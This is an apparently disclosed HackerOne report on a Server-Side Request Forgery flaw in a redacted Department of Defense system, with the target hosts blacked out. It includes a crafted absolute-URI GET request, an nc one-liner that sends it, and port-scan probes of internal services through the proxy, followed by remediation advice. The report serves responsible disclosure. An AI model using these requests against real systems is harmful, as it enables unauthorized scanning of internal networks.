{
  "id": 207477,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDc0Nzc=",
  "url": "https://hackerone.com/reports/207477",
  "title": "SSRF in ███████",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-02-19T11:05:09.890Z",
  "submitted_at": "2017-02-19T11:05:09.890Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "akaki",
    "url": "/akaki",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/134/479/ab3773ce1dcf80c20a8a8eda4663358720cd0dbe_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-12-02T18:42:58.562Z",
  "bug_reporter_agreed_on_going_public_at": "2018-04-10T13:39:46.459Z",
  "team_member_agreed_on_going_public_at": "2019-12-02T18:42:58.442Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** Server-Side Request Forgery (SSRF) vulnerability in the [██████](http://████/).\n\n**Description:** By sending a specially crafted HTTP request, I can forcibly send a URL request from SSI server.\n\nWhen sending the following HTTP request, access from the SSI server was logged on my server.\n\nRequest:\n```http\nGET http://██████████████████/ HTTP/1.1\n\n\n```\n\nYou can send this HTTP request by executing following command.\n>$ echo -ne \"GET http\\://██████████████/ HTTP/1.1\\r\\n\\r\\n\" | nc █████████ 80\n\nResponse:\n```http\nHTTP/1.1 403 Forbidden\nCache-Control: no-cache\nPragma: no-cache\nContent-Type: text/html; charset=utf-8\nProxy-Connection: Keep-Alive\nConnection: Keep-Alive\nContent-Length: 2628\n\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<title>Access Denied</title>\n```\n\nServer Log:\n███████\n\nI judged from the information of the source IP address that it is accessed from the SSI server.\n>$ whois ████████\n>\n>Organization:   ████\n> ..\n>OrgAbusePhone:  +███████\n>OrgAbuseEmail:  █████\\███████\n\n## Impact\nThe attacker can force GET request to be transmitted to other services in the internal network. Furthermore, it is also used for port scan by Cross-Site Port Attack (XSPA).\n\nFor example, I could identify several services running on this server.\n\n* FTP (port 20) and SSH (port 22) are running\n    Request: `GET http://█████████:20/ HTTP/1.1`\n    Response: `HTTP/1.1 503 Service Unavailable`\n\n    Request: `GET http://██████████:21/ HTTP/1.1`\n    Response: `Timeout`\n\n    Request: `GET http://███:22/ HTTP/1.1`\n    Response: `HTTP/1.1 503 Service Unavailable`\n\n* LDAP (port 389) is running\n    Request: `GET http://█████████:387/ HTTP/1.1`\n    Response: `Timeout`\n\n    Request: `GET http://█████:389/ HTTP/1.1`\n    Response: `HTTP/1.1 503 Service Unavailable`\n\n* MSSQL (port 1433) is running\n    Request: `GET http://████████:1431/ HTTP/1.1`\n    Response: `Timeout`\n\n    Request: `GET http://█████:1433/ HTTP/1.1`\n    Response: `HTTP/1.1 503 Service Unavailable`\n\n## Suggested Remediation Actions\nI assume that this behavior is caused not by the web server, but by the system located in front of it (e.g. cache server). In that system, if there is no Host header in the HTTP request (e.g. HTTP/0.9 support) it may be referring to an absolute-URI.\n\nIt is suggested that you change the setting of the cause system so that it does not refer to the absolute-URI of the HTTP request with no Host header.\n\n>This white paper may help you identify the cause.\n>http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 9,
  "voters": [
    "tess",
    "eveeez",
    "lumbridge",
    "kerolesmagdy",
    "0xdf53c",
    "onanana",
    "itsping",
    "c33_k4y",
    "kathirkutty"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
